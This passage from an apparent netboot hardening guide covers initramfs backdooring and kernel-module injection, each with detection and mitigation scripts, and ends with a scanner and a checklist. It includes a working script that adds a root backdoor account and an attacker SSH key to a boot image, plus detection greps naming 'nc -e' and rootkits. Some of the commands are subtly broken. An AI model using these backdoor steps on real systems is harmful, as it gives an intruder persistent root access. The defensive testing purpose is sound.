# 3. Check running processes
ps aux | grep -E "backdoor|suid"

# 4. Check for SUID binaries on NFS mount
find /mnt/nfs -perm -4000 -type f

# Should be minimal/expected ones only
```

**Mitigation:**

```bash
# 1. Use root_squash (DEFAULT, but verify it's set)
cat > /etc/exports << 'EOF'
# Default: root is squashed to nobody
/export/custom-os 192.168.1.0/24(ro,sync,root_squash)

# Explicitly set uid/gid for squashed root
/export/custom-os 192.168.1.0/24(ro,sync,anonuid=65534,anongid=65534)
EOF

exportfs -ra

# 2. Make NFS mount noexec to prevent SUID execution
mount -o ro,noexec,nosuid,nodev 192.168.1.1:/export/custom-os /mnt/root

# 3. Disable setuid in kernel
# Boot parameter: nosuid
# Add to grub.cfg kernel command line

# 4. Use ACLs on NFS server to restrict who can mount
# Advanced NFS security features
```

---

## Part 6: Initramfs & Kernel Attacks

### Attack 6.1: Initramfs Privilege Escalation

**Vulnerability:** Running as root during boot, can modify system

**Risk Level:** 🔴 CRITICAL

**Exploit:**

```bash
#!/bin/bash
# initramfs-privesc.sh - Backdoor during boot

# Modify initramfs /init script to add backdoor
mkdir -p /tmp/initrd-modify
cd /tmp/initrd-modify

gunzip -c /srv/tftp/boot/initrd-netboot.img | cpio -idm

# Add backdoor user
cat >> init << 'EOF'
# Create backdoor user with root privileges
echo "backdoor:x:0:0::/root:/bin/bash" >> /etc/passwd
echo "backdoor:*:18000:0:99999:7:::" >> /etc/shadow

# Or add SSH key (if SSH available in initramfs)
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...attacker_key..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
EOF

# Rebuild initramfs
find . | cpio -H newc -o | gzip > /tmp/initrd-backdoored.img

# Replace original
cp /tmp/initrd-backdoored.img /srv/tftp/boot/initrd-netboot.img
```

**Detection & Testing:**

```bash
#!/bin/bash
# test-initramfs-tampering.sh

# 1. Extract and inspect initramfs
mkdir -p /tmp/initrd-inspect
cd /tmp/initrd-inspect

gunzip -c /srv/tftp/boot/initrd-netboot.img | cpio -idm

# 2. Check init script for suspicious content
grep -n "passwd\|shadow\|ssh\|authorized_keys\|backdoor\|nc -e" init

# 3. Look for unexpected files
find . -name "*.so\|*.ko" -type f | wc -l

# Compare with baseline count

# 4. Check for added packages
ls lib/ | sort > /tmp/current-libs.txt
cat /tmp/baseline-libs.txt > /tmp/baseline-libs.txt

diff /tmp/baseline-libs.txt /tmp/current-libs.txt

# 5. Verify initramfs checksum
sha256sum /srv/tftp/boot/initrd-netboot.img
# Compare with stored baseline
```

**Mitigation:**

```bash
# 1. Sign and verify initramfs
# Generate GPG key
gpg --gen-key

# Sign initramfs
gpg --sign /srv/tftp/boot/initrd-netboot.img

# In boot process, verify signature (requires GPG in bootloader)
# GRUB supports this if configured

# 2. Use measured boot
# If TPM available, measure initramfs hash into TPM

# 3. Store initramfs in read-only location
chmod 444 /srv/tftp/boot/initrd-netboot.img
chmod 555 /srv/tftp/boot/

# 4. Monitor initramfs changes
sudo auditctl -w /srv/tftp/boot/initrd-netboot.img -p wa -k initramfs_changes

# 5. Verify during deployment
# Before adding to TFTP:
./verify-initramfs-integrity.sh /tmp/build/initrd.img
```

---

### Attack 6.2: Kernel Module Injection

**Vulnerability:** Malicious kernel modules can be loaded during boot

**Risk Level:** 🔴 CRITICAL

**Exploit:**

```bash
#!/bin/bash
# kernel-module-injection.sh - Add backdoor kernel module

# Create malicious kernel module
cat > /tmp/backdoor.c << 'C'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Attacker");
MODULE_DESCRIPTION("Kernel backdoor");

int init_module(void) {
  printk(KERN_INFO "Backdoor module loaded\n");
  
  // Gain root privileges
  // Disable security modules
  // Establish reverse shell
  // Exfiltrate data
  
  return 0;
}

void cleanup_module(void) {
  printk(KERN_INFO "Backdoor module unloaded\n");
}
C

# Compile for target kernel
gcc -c /tmp/backdoor.c \
  -I /lib/modules/$(uname -r)/build/include \
  -o /tmp/backdoor.o

ld -r /tmp/backdoor.o -o /tmp/backdoor.ko

# Add to initramfs modules directory
mkdir -p /tmp/initrd-modify/lib/modules/6.1.0/kernel/backdoor/

cp /tmp/backdoor.ko /tmp/initrd-modify/lib/modules/6.1.0/kernel/backdoor/

# Rebuild initramfs
gunzip -c /srv/tftp/boot/initrd-netboot.img | cpio -idm -D /tmp/initrd-modify

find /tmp/initrd-modify | cpio -H newc -o | gzip > /tmp/initrd-backdoored.img

# Replace
cp /tmp/initrd-backdoored.img /srv/tftp/boot/initrd-netboot.img
```

**Detection & Testing:**

```bash
#!/bin/bash
# test-kernel-module-injection.sh

# 1. Check loaded modules
lsmod | wc -l  # Count modules

# Expected count should be consistent

# 2. Find suspicious modules
lsmod | grep -E "backdoor|ptrace|rootkit|exploit"

# 3. Check module source
modinfo module_name
# Verify against known good sources

# 4. Compare modules in initramfs
mkdir -p /tmp/initrd-check
gunzip -c /srv/tftp/boot/initrd-netboot.img | cpio -idm -D /tmp/initrd-check

find /tmp/initrd-check/lib/modules -name "*.ko" -type f | \
  while read mod; do
    modinfo "$mod" 2>/dev/null | grep -i "author\|description"
  done

# 5. Monitor module loading
sudo auditctl -w /lib/modules -p wa -k kernel_modules

sudo ausearch -k kernel_modules
```

**Mitigation:**

```bash
# 1. Kernel module signing
# Configure kernel with module signing enabled
# During build:
# CONFIG_MODULE_SIG=y
# CONFIG_MODULE_SIG_FORCE=y

# 2. Block suspicious modules
cat > /etc/modprobe.d/blacklist-backdoor.conf << 'EOF'
blacklist backdoor
blacklist ptrace_abuse
blacklist rootkit_*
EOF

# 3. Disable module loading after boot
echo 1 > /proc/sys/kernel/modules_disabled

# Add to sysctl:
cat >> /etc/sysctl.d/99-security.conf << 'EOF'
kernel.modules_disabled=1
EOF

# 4. Use dm-verity for read-only root
# Provides cryptographic verification of block device

# 5. Verify module hashes
find /lib/modules -name "*.ko" -exec sha256sum {} \; > /tmp/modules.sha256

# Later verify
sha256sum -c /tmp/modules.sha256

# 6. AppArmor / SELinux module restrictions
# Use mandatory access control to limit module operations
```

---

## Part 7: Complete Testing Framework

### Automated Vulnerability Scanner

```bash
#!/bin/bash
# netboot-vulnerability-scanner.sh

set -e

RESULTS="/tmp/netboot-vuln-report-$(date +%s).txt"
SEVERITY_COUNT=0

{
  echo "╔════════════════════════════════════════════════════════╗"
  echo "║     NETBOOT SECURITY VULNERABILITY SCANNER            ║"
  echo "║     $(date)                  ║"
  echo "╚════════════════════════════════════════════════════════╝"
  echo ""
  
  # 1. DHCP Security Checks
  echo "=== [1] DHCP SECURITY CHECKS ==="
  
  # Check DHCP configuration
  if grep -q "^interface=" /etc/dnsmasq.conf 2>/dev/null; then
    echo "✓ DHCP interface configured"
  else
    echo "✗ [CRITICAL] DHCP not properly configured"
    ((SEVERITY_COUNT++))
  fi
  
  # Check DHCP authentication
  if grep -q "HMAC\|secret\|key" /etc/dhcp/dhcpd.conf 2>/dev/null; then
    echo "✓ DHCP authentication enabled"
  else
    echo "⚠️  [HIGH] DHCP authentication not enabled"
    ((SEVERITY_COUNT++))
  fi
  
  # Check for open DHCP relay
  if netstat -an 2>/dev/null | grep -q ":67.*LISTEN"; then
    echo "⚠️  [HIGH] DHCP port exposed"
  fi
  
  # 2. TFTP Security Checks
  echo ""
  echo "=== [2] TFTP SECURITY CHECKS ==="
  
  # Check TFTP file permissions
  WORLD_READABLE=$(find /srv/tftp -type f -perm -004 | wc -l)
  if [ $WORLD_READABLE -gt 0 ]; then
    echo "✗ [HIGH] $WORLD_READABLE files are world-readable"
    ((SEVERITY_COUNT++))
  else
    echo "✓ TFTP files not world-readable"
  fi
  
  # Check for writable TFTP
  WORLD_WRITABLE=$(find /srv/tftp -type f -perm -002 | wc -l)
  if [ $WORLD_WRITABLE -gt 0 ]; then
    echo "✗ [CRITICAL] $WORLD_WRITABLE TFTP files are writable"
    ((SEVERITY_COUNT++))
  else
    echo "✓ TFTP files not world-writable"
  fi
  
  # Check TFTP is not running as root
  if pgrep tftpd > /dev/null; then
    TFTP_USER=$(ps aux | grep tftpd | grep -v grep | awk '{print $1}')
    if [ "$TFTP_USER" != "root" ]; then
      echo "✓ TFTP running as non-root user ($TFTP_USER)"
    else
      echo "✗ [CRITICAL] TFTP running as root"
      ((SEVERITY_COUNT++))
    fi
  fi
  
  # 3. NFS Security Checks
  echo ""
  echo "=== [3] NFS SECURITY CHECKS ==="
  
  # Check for no_root_squash
  if grep -q "no_root_squash" /etc/exports 2>/dev/null; then
    echo "✗ [CRITICAL] no_root_squash enabled in NFS"
    ((SEVERITY_COUNT++))
  else
    echo "✓ root_squash enabled"
  fi
  
  # Check for insecure NFS options
  if grep -q "insecure" /etc/exports 2>/dev/null; then
    echo "⚠️  [HIGH] 'insecure' option used in NFS"
    ((SEVERITY_COUNT++))
  fi
  
  # Check NFS encryption
  if grep -q "sec=krb5" /etc/exports 2>/dev/null; then
    echo "✓ NFS using Kerberos authentication"
  else
    echo "⚠️  [HIGH] NFS without authentication"
  fi
  
  # 4. Bootloader Security Checks
  echo ""
  echo "=== [4] BOOTLOADER SECURITY CHECKS ==="
  
  # Check GRUB password
  if grep -q "set superusers" /srv/tftp/grub/grub.cfg 2>/dev/null; then
    echo "✓ GRUB superuser set"
  else
    echo "⚠️  [HIGH] GRUB without password protection"
    ((SEVERITY_COUNT++))
  fi
  
  # Check GRUB config readable
  GRUB_PERMS=$(stat -c %a /srv/tftp/grub/grub.cfg 2>/dev/null)
  if [ "$GRUB_PERMS" != "440" ] && [ "$GRUB_PERMS" != "400" ]; then
    echo "✗ [HIGH] GRUB config has weak permissions: $GRUB_PERMS"
    ((SEVERITY_COUNT++))
  fi
  
  # 5. File Integrity Checks
  echo ""
  echo "=== [5] FILE INTEGRITY CHECKS ==="
  
  # Check if baseline exists
  if [ -f /tmp/netboot-baseline.sha256 ]; then
    CHANGED=$(sha256sum -c /tmp/netboot-baseline.sha256 2>/dev/null | grep FAILED | wc -l)
    if [ $CHANGED -gt 0 ]; then
      echo "✗ [CRITICAL] $CHANGED files changed since baseline"
      ((SEVERITY_COUNT++))
    else
      echo "✓ All files match baseline integrity"
    fi
  else
    echo "⚠️  [INFO] No baseline integrity file. Creating..."
    for f in /srv/tftp/pxelinux.0 /srv/tftp/boot/*; do
      sha256sum "$f" >> /tmp/netboot-baseline.sha256
    done
  fi
  
  # 6. Network Security
  echo ""
  echo "=== [6] NETWORK SECURITY CHECKS ==="
  
  # Check for ARP spoofing protection
  if arpwatch -i eth0 -d &>/dev/null; then
    echo "✓ ARP monitoring available"
  fi
  
  # Check firewall rules
  if sudo ufw status 2>/dev/null | grep -q "active"; then
    echo "✓ UFW firewall active"
    
    # Check DHCP/TFTP restricted
    if sudo ufw show added 2>/dev/null | grep -q "67\|69"; then
      echo "✓ DHCP/TFTP rules configured"
    else
      echo "⚠️  [MEDIUM] No explicit DHCP/TFTP firewall rules"
    fi
  else
    echo "⚠️  [MEDIUM] Firewall not active"
  fi
  
  # 7. Kernel Security
  echo ""
  echo "=== [7] KERNEL SECURITY CHECKS ==="
  
  # Check SELinux/AppArmor
  if getenforce 2>/dev/null | grep -q "Enforcing"; then
    echo "✓ SELinux enforcing"
  elif sudo aa-status 2>/dev/null | grep -q "enabled"; then
    echo "✓ AppArmor enabled"
  else
    echo "⚠️  [MEDIUM] No mandatory access control enabled"
  fi
  
  # Check kernel parameters
  sysctl -n kernel.sysrq 2>/dev/null | grep -q "0" && \
    echo "✓ Magic SysRq disabled" || \
    echo "⚠️  [MEDIUM] Magic SysRq enabled"
  
  sysctl -n kernel.kexec_load_disabled 2>/dev/null | grep -q "1" && \
    echo "✓ Kexec disabled" || \
    echo "⚠️  [MEDIUM] Kexec enabled"
  
  # Summary
  echo ""
  echo "╔════════════════════════════════════════════════════════╗"
  echo "║ SEVERITY SUMMARY"
  echo "║ Critical Issues Found: $SEVERITY_COUNT"
  echo "║ Report: $RESULTS"
  echo "╚════════════════════════════════════════════════════════╝"
  
} | tee "$RESULTS"

exit $SEVERITY_COUNT
```

---

## Part 8: Mitigation Checklist

```
CRITICAL (Must Fix):
☐ Disable no_root_squash on NFS
☐ Remove world-writable files from TFTP
☐ TFTP running as non-root
☐ GRUB/pxelinux password protected
☐ File integrity monitoring enabled
☐ Kernel command line validated
☐ initramfs digitally signed
☐ NFS exports restricted by IP

HIGH (Should Fix):
☐ DHCP server authentication
☐ TFTP file checksums verified
☐ NFS over encrypted channel
☐ Firewall rules for netboot ports
☐ SELinux/AppArmor enforcing
☐ Kernel module signing
☐ Boot logs collected and monitored

MEDIUM (Nice to Have):
☐ ARP spoofing detection
☐ Network segmentation/VLAN
☐ Serial console logging
☐ Intrusion detection system
☐ Security audit logging enabled
☐ Regular security testing

TESTING:
☐ Run vulnerability scanner monthly
☐ Test DHCP resilience
☐ Test TFTP integrity verification
☐ Test NFS export restrictions
☐ Test bootloader protections
☐ Test kernel hardening parameters
```

This comprehensive guide covers practical vulnerabilities, testable exploits, and real mitigations for netboot security.